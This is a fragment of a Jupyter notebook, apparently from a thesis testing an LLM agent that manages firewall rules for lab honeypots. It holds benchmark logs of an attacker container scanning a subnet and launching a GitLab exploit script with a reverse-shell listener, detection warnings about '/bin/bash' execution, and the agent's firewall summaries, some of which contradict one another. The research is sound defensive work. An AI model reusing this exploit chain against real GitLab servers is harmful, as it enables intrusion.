      "  File \"/home/c0ff3k1ll3r/Desktop/Thesis/AI_Agent_for_honeypot_operations/HoneypotAgentApp/.venv/lib/python3.13/site-packages/urllib3/response.py\", line 691, in close\n",
      "    self._fp.close()\n",
      "  File \"/usr/lib/python3.13/http/client.py\", line 432, in close\n",
      "    super().close() # set \"closed\" flag\n",
      "  File \"/usr/lib/python3.13/http/client.py\", line 445, in flush\n",
      "    self.fp.flush()\n",
      "ValueError: I/O operation on closed file.\n",
      "WARNING:tools:CRITICAL: 4 command execution attempts detected!\n",
      "WARNING:tools:  Command from 192.168.100.2: Command execution: /bin/bash\n",
      "WARNING:tools:  Command from 192.168.100.2: Direct system command execution\n",
      "WARNING:tools:  Command from 192.168.100.2: Command execution: /bin/bash\n",
      "WARNING:nodes:Security events: Found 4 command execution attempts from 2 threat IPs\n",
      "WARNING:nodes:Found 4 threat incidents without payload content:\n",
      "WARNING:nodes:  - 192.168.100.2 -> Command execution: /bin/bash\n",
      "WARNING:nodes:  - 192.168.100.2 -> Direct system command execution\n",
      "WARNING:nodes:  - 192.168.100.2 -> Command execution: /bin/bash\n",
      "WARNING:nodes:  - 192.168.100.2 -> Direct system command execution\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing packets and verifying detected threats...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:benchmark.Orchestrator:=== Phase: FIREWALL_UPDATE_WAIT ===\n",
      "INFO:benchmark.Orchestrator:Waiting 1s for firewall updates...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Memory: Iteration saved with ID iteration_7. Total iterations: 7\n",
      "Performing complete cleanup before ending iteration...\n",
      "Flushing all messages and resetting state for next iteration\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: METRICS_COLLECTION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: EPOCH_COMPLETE ===\n",
      "INFO:benchmark.Orchestrator:Saved epoch results to benchmark_results/20250627_122023/epoch_007.json\n",
      "INFO:benchmark.Orchestrator:Waiting 3s before next epoch...\n",
      "INFO:benchmark.Orchestrator:\n",
      "============================================================\n",
      "INFO:benchmark.Orchestrator:EPOCH 8 STARTING\n",
      "INFO:benchmark.Orchestrator:============================================================\n",
      "\n",
      "INFO:benchmark.Orchestrator:=== Phase: INITIALIZATION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: ATTACK_EXECUTION ===\n",
      "INFO:benchmark.Orchestrator:Starting attacker script with a fallback timeout of 300s...\n",
      "INFO:benchmark.Orchestrator:Attack script running with a fallback timeout of 300s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-8] [*] Attacker IP address: 192.168.100.2\n",
      "[*] Launching exploit manager...\n",
      "[*] Scanning 172.20.0.0/27 for open ports...\n",
      "[ATTACK-8] [+] Host 172.20.0.6 has open ports: [('80', 'http')]\n",
      "[*] Checking port 80 for GitLab...\n",
      "[ATTACK-8] [*] Checking port 80 for Struts...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:Attack script completed before timeout.\n",
      "INFO:benchmark.Orchestrator:=== Phase: MONITORING_ACCUMULATION ===\n",
      "INFO:benchmark.Orchestrator:Accumulating monitoring data for 3s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-8] Checking if version is vulnerable: 13.12.3\n",
      "\n",
      "[+] Detected vulnerable services:\n",
      "\n",
      "[ATTACK-8] Service    Target        Port  Path                  Version\n",
      "---------  ----------  ------  --------------------  ---------\n",
      "GITLAB     172.20.0.6      80  http://172.20.0.6:80  13.12.3\n",
      "\n",
      "[ATTACK-8] [>>>] Launching GitLab exploit against http://172.20.0.6:80 (version: 13.12.3)[ATTACK-8] \n",
      "[ATTACK-8] GITLAB >> ['/attacker/scripts/gitlab/gitlab_exploit.py', 'http://172.20.0.6:80', '192.168.100.2']\n",
      "GITLAB >> [*] Starting scan and exploit chain...\n",
      "GITLAB >> [*] Starting network listener script\n",
      "[ATTACK-8] GITLAB >> [*] Waiting 5 seconds before triggering the connection...\n",
      "[ATTACK-8] GITLAB >> [*] Setting up listener on 0.0.0.0:9001\n",
      "[ATTACK-8] GITLAB >> [!] Error in listener: [Errno 98] Address already in use\n",
      "GITLAB >> [*] Listener closed\n",
      "[ATTACK-8] \n",
      "=== 🏁 Flags Summary ===\n",
      "[*] Exploit executed successfully\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: AGENT_ANALYSIS ===\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing agent for epoch 8\n",
      "Loaded 5 recent iterations from episodic memory.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing packets and verifying detected threats...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:benchmark.Orchestrator:=== Phase: FIREWALL_UPDATE_WAIT ===\n",
      "INFO:benchmark.Orchestrator:Waiting 1s for firewall updates...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Memory: Iteration saved with ID iteration_8. Total iterations: 8\n",
      "Performing complete cleanup before ending iteration...\n",
      "Flushing all messages and resetting state for next iteration\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: METRICS_COLLECTION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: EPOCH_COMPLETE ===\n",
      "INFO:benchmark.Orchestrator:Saved epoch results to benchmark_results/20250627_122023/epoch_008.json\n",
      "INFO:benchmark.Orchestrator:Waiting 3s before next epoch...\n",
      "INFO:benchmark.Orchestrator:\n",
      "============================================================\n",
      "INFO:benchmark.Orchestrator:EPOCH 9 STARTING\n",
      "INFO:benchmark.Orchestrator:============================================================\n",
      "\n",
      "INFO:benchmark.Orchestrator:=== Phase: INITIALIZATION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: ATTACK_EXECUTION ===\n",
      "INFO:benchmark.Orchestrator:Starting attacker script with a fallback timeout of 300s...\n",
      "INFO:benchmark.Orchestrator:Attack script running with a fallback timeout of 300s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-9] [*] Attacker IP address: 192.168.100.2\n",
      "[*] Launching exploit manager...\n",
      "[*] Scanning 172.20.0.0/27 for open ports...\n",
      "[ATTACK-9] [+] Host 172.20.0.6 has open ports: [('80', 'http')]\n",
      "[*] Checking port 80 for GitLab...\n",
      "[ATTACK-9] [*] Checking port 80 for Struts...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:Attack script completed before timeout.\n",
      "INFO:benchmark.Orchestrator:=== Phase: MONITORING_ACCUMULATION ===\n",
      "INFO:benchmark.Orchestrator:Accumulating monitoring data for 3s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-9] Checking if version is vulnerable: 13.12.3\n",
      "\n",
      "[+] Detected vulnerable services:\n",
      "\n",
      "[ATTACK-9] Service    Target        Port  Path                  Version\n",
      "---------  ----------  ------  --------------------  ---------\n",
      "GITLAB     172.20.0.6      80  http://172.20.0.6:80  13.12.3\n",
      "\n",
      "[ATTACK-9] [>>>] Launching GitLab exploit against http://172.20.0.6:80 (version: 13.12.3)\n",
      "[ATTACK-9] GITLAB >> ['/attacker/scripts/gitlab/gitlab_exploit.py', 'http://172.20.0.6:80', '192.168.100.2']\n",
      "GITLAB >> [*] Starting scan and exploit chain...\n",
      "GITLAB >> [*] Starting network listener script\n",
      "GITLAB >> [*] Waiting 5 seconds before triggering the connection...[*] Setting up listener on 0.0.0.0:9001\n",
      "GITLAB >> \n",
      "[ATTACK-9] GITLAB >> [!] Error in listener: [Errno 98] Address already in use\n",
      "GITLAB >> [*] Listener closed\n",
      "[ATTACK-9] \n",
      "=== 🏁 Flags Summary ===\n",
      "[*] Exploit executed successfully\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: AGENT_ANALYSIS ===\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing agent for epoch 9\n",
      "Loaded 5 recent iterations from episodic memory.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing packets and verifying detected threats...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:benchmark.Orchestrator:=== Phase: FIREWALL_UPDATE_WAIT ===\n",
      "INFO:benchmark.Orchestrator:Waiting 1s for firewall updates...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Memory: Iteration saved with ID iteration_9. Total iterations: 9\n",
      "Performing complete cleanup before ending iteration...\n",
      "Flushing all messages and resetting state for next iteration\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: METRICS_COLLECTION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: EPOCH_COMPLETE ===\n",
      "INFO:benchmark.Orchestrator:Saved epoch results to benchmark_results/20250627_122023/epoch_009.json\n",
      "INFO:benchmark.Orchestrator:Waiting 3s before next epoch...\n",
      "INFO:benchmark.Orchestrator:\n",
      "============================================================\n",
      "INFO:benchmark.Orchestrator:EPOCH 10 STARTING\n",
      "INFO:benchmark.Orchestrator:============================================================\n",
      "\n",
      "INFO:benchmark.Orchestrator:=== Phase: INITIALIZATION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: ATTACK_EXECUTION ===\n",
      "INFO:benchmark.Orchestrator:Starting attacker script with a fallback timeout of 300s...\n",
      "INFO:benchmark.Orchestrator:Attack script running with a fallback timeout of 300s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-10] [*] Attacker IP address: 192.168.100.2\n",
      "[*] Launching exploit manager...\n",
      "[*] Scanning 172.20.0.0/27 for open ports...\n",
      "[ATTACK-10] [+] Host 172.20.0.6 has open ports: [('80', 'http')]\n",
      "[*] Checking port 80 for GitLab...\n",
      "[ATTACK-10] [*] Checking port 80 for Struts...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:Attack script completed before timeout.\n",
      "INFO:benchmark.Orchestrator:=== Phase: MONITORING_ACCUMULATION ===\n",
      "INFO:benchmark.Orchestrator:Accumulating monitoring data for 3s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-10] Checking if version is vulnerable: 13.12.3\n",
      "\n",
      "[+] Detected vulnerable services:\n",
      "\n",
      "[ATTACK-10] Service    Target        Port  Path                  Version\n",
      "---------  ----------  ------  --------------------  ---------\n",
      "GITLAB     172.20.0.6      80  http://172.20.0.6:80  13.12.3\n",
      "\n",
      "[ATTACK-10] [>>>] Launching GitLab exploit against http://172.20.0.6:80 (version: 13.12.3)\n",
      "[ATTACK-10] GITLAB >> ['/attacker/scripts/gitlab/gitlab_exploit.py', 'http://172.20.0.6:80', '192.168.100.2']\n",
      "GITLAB >> [*] Starting scan and exploit chain...\n",
      "GITLAB >> [*] Starting network listener script\n",
      "GITLAB >> [*] Waiting 5 seconds before triggering the connection...\n",
      "GITLAB >> [*] Setting up listener on 0.0.0.0:9001\n",
      "[ATTACK-10] GITLAB >> [!] Error in listener: [Errno 98] Address already in use\n",
      "GITLAB >> [*] Listener closed\n",
      "[ATTACK-10] \n",
      "=== 🏁 Flags Summary ===\n",
      "[*] Exploit executed successfully\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: AGENT_ANALYSIS ===\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing agent for epoch 10\n",
      "Loaded 5 recent iterations from episodic memory.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing packets and verifying detected threats...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:benchmark.Orchestrator:=== Phase: FIREWALL_UPDATE_WAIT ===\n",
      "INFO:benchmark.Orchestrator:Waiting 1s for firewall updates...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Memory: Iteration saved with ID iteration_10. Total iterations: 10\n",
      "Performing complete cleanup before ending iteration...\n",
      "Flushing all messages and resetting state for next iteration\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: METRICS_COLLECTION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: EPOCH_COMPLETE ===\n",
      "INFO:benchmark.Orchestrator:Saved epoch results to benchmark_results/20250627_122023/epoch_010.json\n",
      "INFO:benchmark.Orchestrator:Saved report to benchmark_results/20250627_122023/benchmark_report.json\n",
      "INFO:benchmark.Orchestrator:Cleaning up benchmark resources\n",
      "INFO:benchmark.AttackerController:Stopped and removed attacker container\n"
     ]
    }
   ],
   "source": [
    "runner = b.BenchmarkRunner(config_dict)\n",
    "\n",
    "def my_agent_executor(epoch_num: int):\n",
    "    print(f\"Executing agent for epoch {epoch_num}\")\n",
    "    initial_state = HoneypotStateReact(\n",
    "        messages = \"Analyze a time_window=2 for all the tools and actually use the tool for adding firewall rules\",\n",
    "    )\n",
    "    return graph.invoke(initial_state, config={\"configurable\": {\"store\" : memory}})\n",
    "\n",
    "results = runner.run(my_agent_executor)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "6010160c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing Honeypot Firewall Guardian Protocol...\n",
      "\n",
      "```\n",
      "## ITERATION SUMMARY\n",
      "\n",
      "**HONEYPOT STATUS:**\n",
      "- **Currently Exposed:** 172.20.0.2:8080 (Struts2)\n",
      "- **Exploitation Level:** 100%\n",
      "- **Evidence Summary:** \n",
      "  - In the last 2 minutes, continued detection of attacker 192.168.100.2 performing command execution, reverse shell attempts, direct system command execution, privilege escalation activities, and data exfiltration (as previously confirmed). No further escalation possible—full lifecycle achieved.\n",
      "  - No novel threats or new compromise behaviors on any other honeypot; gitlab-proxy and GitLab remain in prior states.\n",
      "\n",
      "**FIREWALL ACTIONS:**\n",
      "- **Rules Applied:**\n",
      "  - None newly added—Struts2 already in lockdown (all critical allow rules have been removed in previous lockdown, only residual ACCEPT for .2→attacker remains).\n",
      "  - No block rules newly added, as global lockdown is already enforced on all exploited surfaces.\n",
      "\n",
      "- **Justification:**\n",
      "  - Attack graph for Struts2 is confirmed at 100% (privilege escalation, root access, and exfiltration from 192.168.100.2). Even though command executions persist in logs, they are additional evidence of post-compromise behavior rather than novel attacks. Exposure to Struts2 remains locked down per protocol.\n",
      "  - No other honeypots require new exposure or block actions; all previous privilege escalation triggers and post-compromise lifecycle were documented and locked down.\n",
      "\n",
      "**ATTACK GRAPH PROGRESSION:**\n",
      "- **Honeypot 1 (172.20.0.6):** 33% (EXPOSED) - gitlab-proxy (nginx) - Recon/scanning only, no exploitation\n",
      "- **Honeypot 2 (172.20.0.5):** 100% (PRIVILEGE_ESCALATION) - GitLab (vulhub) - Prior root shell and post-exploitation\n",
      "- **Honeypot 3 (172.20.0.2):** 100% (PRIVILEGE_ESCALATION) - Struts2 (vulhub) - Full attacker lifecycle: reverse shell, root commands, exfil\n",
      "\n",
      "**DECISION RATIONALE:**\n",
      "- Struts2 and GitLab attack graphs are fully covered. All actions (block/removal of allow rules) implemented in previous iterations; no new actionable threats or target rotation opportunity exists—all honeypots reached end-of-graph states.\n",
      "- Scan/command artifacts on Struts2 are repeat activity from an attacker that is already locked out per protocol; no deviation from established lockdown posture is warranted.\n",
      "\n",
      "**NEXT ITERATION GUIDANCE:**\n",
      "- Continue global lockdown posture: monitor for new attacker source IPs or novel lateral movement attempts in logs; no new firewall changes required unless a new, unanticipated service/honeypot appears or a new source IP initiates a novel attack sequence.\n",
      "- Prepare to document and analyze forensics, but do not alter exposure in the current cycle.\n",
      "\n",
      "**LOCKDOWN STATUS:** ACTIVE\n",
      "```\n",
      "Executing Honeypot Firewall Guardian Protocol...\n",
      "\n",
      "```\n",
      "## ITERATION SUMMARY\n",
      "\n",
      "**HONEYPOT STATUS:**\n",
      "- **Currently Exposed:** NONE (all are in lockdown or past completion)\n",
      "- **Exploitation Level:** 100%\n",
      "- **Evidence Summary:** \n",
      "  - Struts2 honeypot (172.20.0.2): Confirmed ongoing attacker command execution (/bin/bash, direct system commands, reverse shell attempts, root file access, and privilege escalation events) specifically from 192.168.100.2.\n",
      "  - Network intelligence (flows, security events, and compressed packets) all corroborate that the attacker's lifecycle (including all privilege escalation steps) is fully covered for Struts2. No new exploitation behaviors on other honeypots; GitLab remains at 100%, gitlab-proxy at 33%.\n",
      "\n",
      "**FIREWALL ACTIONS:**\n",
      "- **Rules Applied:**\n",
      "  - No new allow rules added.\n",
      "  - All required exposures for attack graph exploration have already taken place.\n",
      "  - Previous blocks and removals were executed as Struts2 reached 100%.\n",
      "- **Justification:**\n",
      "  - The attack graph's terminal state has been reached for Struts2 and GitLab based on continuous evidence of core exploitation steps and post-exploitation lifecycle completion.\n",
      "  - All necessary lockdown actions are already applied (allow rules for exposed ports have been removed, and further traffic to these containers is effectively blocked).\n",
      "\n",
      "**ATTACK GRAPH PROGRESSION:**\n",
      "- **Honeypot 1 (172.20.0.6):** 33% (EXPOSED) - gitlab-proxy (nginx) - Recon/scanning; no exploitation observed; not directly targeted in exploit chain.\n",
      "- **Honeypot 2 (172.20.0.5):** 100% (PRIVILEGE_ESCALATION) - GitLab (vulhub) - Full attacker lifecycle, root shell, and post-exploitation achieved in previous rounds.\n",
      "- **Honeypot 3 (172.20.0.2):** 100% (PRIVILEGE_ESCALATION) - Struts2 (vulhub) - Command execution and privilege escalation, all core attacker behaviors observed.\n",
      "\n",
      "**DECISION RATIONALE:**\n",
      "- No new firewall changes are necessary. Lockdown mode remains active: All available honeypots that could be fully explored have achieved 100% compromise, matching policy for total network lockdown.\n",
      "- Firewall policy, system health, and monitoring remain operational.\n",
      "- All intelligence collection requirements and security protocol duties have been fulfilled for the current assessment cycle.\n",
      "\n",
      "**NEXT ITERATION GUIDANCE:**\n",
      "- Remain in lockdown. Continue passive monitoring for new untrusted source IPs, anomalous lateral movement, or system reconfiguration that would necessitate changes.\n",
      "- No additional exposure or rule changes until a new, unexplored honeypot is deployed or a new threat pattern emerges.\n",
      "\n",
      "**LOCKDOWN STATUS:** ACTIVE\n",
      "```\n",
      "Executing Honeypot Firewall Guardian Protocol...\n",
      "\n",
      "```\n",
      "## ITERATION SUMMARY\n",
      "\n",
      "**HONEYPOT STATUS:**\n",
      "- **Currently Exposed:** NONE (all have reached lockdown or 100% completion)\n",
      "- **Exploitation Level:** 100%\n",
      "- **Evidence Summary:** \n",
      "  - No new command executions, reverse shells, or privilege escalation attempts in the last 2 minutes. Only low-confidence, low-severity \"path traversal: directory traversal attempt\" observed with no follow-up compromise or confirmed exploitation.\n",
      "  - High volume of HTTP/port 80 traffic between attacker 192.168.100.2 and gitlab-proxy (172.20.0.6), but no verified exploit or command execution. All other honeypots remain in prior terminal (rooted) or scanned-only states.\n",
      "\n",
      "**FIREWALL ACTIONS:**\n",
      "- **Rules Applied:**\n",
      "  - No new allow or block rules added in this cycle.\n",
      "  - Existing rule for 192.168.100.2 → 172.20.0.6:80 (ACCEPT) remains to allow monitoring of low-risk reconnaissance on unfinished attack branch.\n",
      "- **Justification:**\n",
      "  - Protocol mandates lockdown only when all honeypots reach 100% exploitation; gitlab-proxy remains at 33% (scanned, unexploited). No evidence supports privilege escalation or deeper compromise—exposure is restricted to promote possible further attacker activity for intelligence gathering.\n",
      "\n",
      "**ATTACK GRAPH PROGRESSION:**\n",
      "- **Honeypot 1 (172.20.0.6):** 33% (EXPOSED) - gitlab-proxy (nginx) - Ongoing HTTP scan/probing, no exploit evidence, no shell or root activity detected.\n",
      "- **Honeypot 2 (172.20.0.5):** 100% (PRIVILEGE_ESCALATION) - GitLab (vulhub) - Full attacker lifecycle and post-exploitation reached in prior iterations.\n",
      "- **Honeypot 3 (172.20.0.2):** 100% (PRIVILEGE_ESCALATION) - Struts2 (vulhub) - Root, shell, and data exfil completed historically.\n",
      "\n",
      "**DECISION RATIONALE:**\n",
      "- Per protocol, maintain current exposure of gitlab-proxy (172.20.0.6:80) to facilitate potential escalation and intelligence gathering. No firewall escalation is warranted in response to the observed low-confidence, non-compromising path traversal scans. No other honeypots require exposure or additional blocking—maximum coverage on critical containers has been achieved.\n",
      "\n",
      "**NEXT ITERATION GUIDANCE:**\n",
      "- Continue to monitor for evidence of exploitation attempts or command execution on gitlab-proxy. If any verified shell or privilege escalation is observed, elevate its attack graph status and, if all reach 100%, proceed with global lockdown. Ensure thorough forensic packet inspection for subtle threats and log analysis to distinguish benign activity from delayed/slow attacks.\n",
      "\n",
      "**LOCKDOWN STATUS:** INACTIVE\n",
      "```\n",
      "\n",
      "Executing Honeypot Firewall Guardian Protocol...\n",
      "\n",
      "```\n",
      "## ITERATION SUMMARY\n",
      "\n",
      "**HONEYPOT STATUS:**\n",
      "- **Currently Exposed:** 172.20.0.6:80 (gitlab-proxy)\n",
      "- **Exploitation Level:** 33% (EXPOSED)\n",
      "- **Evidence Summary:** \n",
      "  - Attacker (192.168.100.2) is persistently performing heavy HTTP scanning and probing on gitlab-proxy (172.20.0.6:80). No evidence of exploitation, command execution, or privilege escalation is present in the last 2-minute window. All threat detections are low-confidence (e.g., \"path traversal: directory traversal attempt\") and lack any payload or effect indicating successful compromise.\n",
      "\n",
      "**FIREWALL ACTIONS:**\n",
      "- **Rules Applied:** \n",
      "  - No new rules added or removed. The current ACCEPT rule allowing 192.168.100.2 → 172.20.0.6:80 (tcp) remains active to facilitate progressive attacker engagement with the honeypot.\n",
      "- **Justification:** \n",
      "  - The attack graph for gitlab-proxy is only at 33% (exposed, unexploited). According to protocol, strategic exposure must be maintained until there is evidence of deeper exploitation or privilege escalation. No additional services or ports require exposure at this time, and no threats necessitate blocking.\n",
      "\n",
      "**ATTACK GRAPH PROGRESSION:**\n",
      "- **Honeypot 1 (172.20.0.6):** 33% (EXPOSED) - gitlab-proxy (nginx) - Heavy HTTP scan, no exploitation observed\n",
      "- **Honeypot 2 (172.20.0.5):** 100% (PRIVILEGE_ESCALATION) - GitLab (vulhub) - Previously fully exploited (root/post-exploitation achieved)\n",
      "- **Honeypot 3 (172.20.0.2):** 100% (PRIVILEGE_ESCALATION) - Struts2 (vulhub) - Previously fully exploited (root/post-exploitation lifecycle)\n",
      "\n",
      "**DECISION RATIONALE:**\n",
      "- The honeypot attack graph is not fully explored for gitlab-proxy. Exposure continues as required for intelligence gathering and to provide further opportunity for exploitation before triggering a lockdown. Automated packet, network, and event analysis all indicate no novel escalation, so no modifications to firewall policy are warranted in this cycle.\n",
      "\n",
      "**NEXT ITERATION GUIDANCE:**\n",
      "- Continue close monitoring for signs of exploitation or progression (e.g., web shell, command execution, privilege escalation) on gitlab-proxy. If any such evidence appears, escalate the honeypot's attack graph status and assess whether to rotate targets or proceed to lockdown.\n",
      "- Confirm no new honeypots or containers are deployed into the protected subnet in future cycles.\n",
      "\n",
      "**LOCKDOWN STATUS:** INACTIVE\n",
      "```\n",
      "Executing Honeypot Firewall Guardian Protocol...\n",
      "\n",
      "```\n",
      "## ITERATION SUMMARY\n",
      "\n",
      "**HONEYPOT STATUS:**\n",
      "- **Currently Exposed:** 172.20.0.6:80 (gitlab-proxy)\n",
      "- **Exploitation Level:** 33% (EXPOSED)\n",
      "- **Evidence Summary:** \n",
      "  - Attacker (192.168.100.2) is performing high-volume HTTP probing on gitlab-proxy (172.20.0.6) via port 80, with 1845 packets and thousands of TCP flows logged in the last 2 minutes.\n",
      "  - Only low-confidence, non-compromising activities observed: \"network interface enumeration,\" \"path traversal: directory traversal attempt\" on unrelated targets, but no payloads or activity confirming exploitation, web shell, or privilege escalation.\n",
      "  - No command executions observed, no escalation to web shell or root-level compromise.\n",
      "\n",
      "**FIREWALL ACTIONS:**\n",
      "- **Rules Applied:** \n",
      "  - No new allow or block rules added this cycle. \n",
      "  - The existing ACCEPT rule allowing 192.168.100.2 → 172.20.0.6:80 (tcp) remains present, supporting continued attacker engagement on this exposed honeypot.\n",
      "- **Justification:** \n",
      "  - Protocol requires strategic exposure for intelligence gathering until there is evidence of exploitation or privilege escalation. Current traffic is heavily focused on scanning but remains at the EXPOSED stage. No evidence warrants escalation (block) or rotation/lockdown.\n",
      "\n",
      "**ATTACK GRAPH PROGRESSION:**\n",
      "- **Honeypot 1 (172.20.0.6):** 33% (EXPOSED) - gitlab-proxy (nginx) - High-volume HTTP scan, no shell, no exploit\n",
      "- **Honeypot 2 (172.20.0.5):** 100% (PRIVILEGE_ESCALATION) - GitLab (vulhub) - Previously fully compromised (root/post-exploitation achieved)\n",
      "- **Honeypot 3 (172.20.0.2):** 100% (PRIVILEGE_ESCALATION) - Struts2 (vulhub) - Previously fully exploited (root/post-exploitation lifecycle)\n",
      "\n",
      "**DECISION RATIONALE:**\n",
      "- As gitlab-proxy has not advanced past the exposure/reconnaissance stage, and there remains significant opportunity for further compromise, continued exposure is the correct action. This supports both intelligence gathering and correct protocol operation on attack graph tracking.\n",
      "- No new or elevated threats are present; protocol mandates maximum attack surface coverage before implementing additional blocks or proceeding to lockdown.\n",
      "\n",
      "**NEXT ITERATION GUIDANCE:**\n",
      "- Continue focused monitoring for escalation of gitlab-proxy, especially for any evidence of command execution, web shell, or privilege escalation. If exploitation is detected, escalate this honeypot to 66% or higher and make appropriate exposure or lockdown decisions.\n",
      "- Continue to verify that no new honeypots are introduced into the subnet and confirm there are no lateral movement attempts from attacker IPs.\n",
      "\n",
      "**LOCKDOWN STATUS:** INACTIVE\n",
      "```\n"
     ]
    }
   ],
   "source": [
    "for message in memory.get_recent_iterations():\n",
    "    print(message.value['last_message'])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d5e49cc8",
   "metadata": {},
   "source": [
    "# Benchmark with monitoring"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bdc9edf6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Epoch: 1/5'"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "ename": "CancelledError",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[31m---------------------------------------------------------------------------\u001b[39m",
      "\u001b[31mCancelledError\u001b[39m                            Traceback (most recent call last)",
      "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[14]\u001b[39m\u001b[32m, line 30\u001b[39m\n\u001b[32m     27\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m runner.results\n\u001b[32m     29\u001b[39m \u001b[38;5;66;03m# Run with monitoring\u001b[39;00m\n\u001b[32m---> \u001b[39m\u001b[32m30\u001b[39m results = \u001b[38;5;28;01mawait\u001b[39;00m run_with_monitoring()\n",
      "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[14]\u001b[39m\u001b[32m, line 25\u001b[39m, in \u001b[36mrun_with_monitoring\u001b[39m\u001b[34m()\u001b[39m\n\u001b[32m     22\u001b[39m             df = pd.DataFrame([status[\u001b[33m\"\u001b[39m\u001b[33mlatest_metrics\u001b[39m\u001b[33m\"\u001b[39m]])\n\u001b[32m     23\u001b[39m             display(df[[\u001b[33m'\u001b[39m\u001b[33mepoch_number\u001b[39m\u001b[33m'\u001b[39m, \u001b[33m'\u001b[39m\u001b[33mlockdown_activated\u001b[39m\u001b[33m'\u001b[39m, \u001b[33m'\u001b[39m\u001b[33mattack_graph_coverage\u001b[39m\u001b[33m'\u001b[39m]])\n\u001b[32m---> \u001b[39m\u001b[32m25\u001b[39m     \u001b[38;5;28;01mawait\u001b[39;00m asyncio.sleep(\u001b[32m5\u001b[39m)\n\u001b[32m     27\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m runner.results\n",
